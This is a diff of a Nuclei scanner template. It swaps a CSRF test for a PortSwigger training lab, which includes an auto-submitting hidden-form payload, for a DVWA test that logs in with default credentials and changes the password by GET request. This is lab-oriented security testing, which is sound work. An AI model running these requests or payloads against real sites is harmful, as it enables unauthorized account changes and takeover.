@@ -1,29 +1,41 @@
-id: csrf-no-defenses
+id: dvwa-csrf-validado
+
 info:
-  name: CSRF Vulnerability - Change Email (No Defenses)
-  author: YourName
-  severity: High
-  description: This template simulates a CSRF attack to change the email address.
-  reference:
-    - https://portswigger.net/web-security/csrf/lab-no-defenses
+  name: Test CSRF para DVWA con manejo de sesión
+  severity: high
+  author: usuario
+  description: |
+    Verifica vulnerabilidad CSRF en DVWA con manejo adecuado de cookies
+    y seguimiento de redirecciones
 
 http:
-  - method: POST
-    path:
-      - "https://0aab00c4038b6c128068a3db001700d1.web-security-academy.net/my-account/change-email"
-    body: |
-      email=anything%40web-security-academy.net
-    headers:
-      Content-Type: application/x-www-form-urlencoded
+  - raw:
+      - |
+        GET /dvwa/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: security=low
+
+      - |
+        POST /dvwa/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: security=low
+
+        username=admin&password=password&Login=Login
+
+      - |
+        GET /dvwa/vulnerabilities/csrf/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: security=low; {{session_cookie}}
+
+      - |
+        GET /dvwa/vulnerabilities/csrf/?password_new=nuclei_test&password_conf=nuclei_test&Change=Change HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: security=low; {{session_cookie}}
+
+    cookie-reuse: true
     matchers:
       - type: word
         words:
-          - "Email address updated"
+          - "Password Changed"
         part: body
-    script: |
-      <form method="POST" action="https://0aab00c4038b6c128068a3db001700d1.web-security-academy.net/my-account/change-email">
-        <input type="hidden" name="email" value="anything%40web-security-academy.net">
-      </form>
-      <script>
-        document.forms[0].submit();
-      </script>
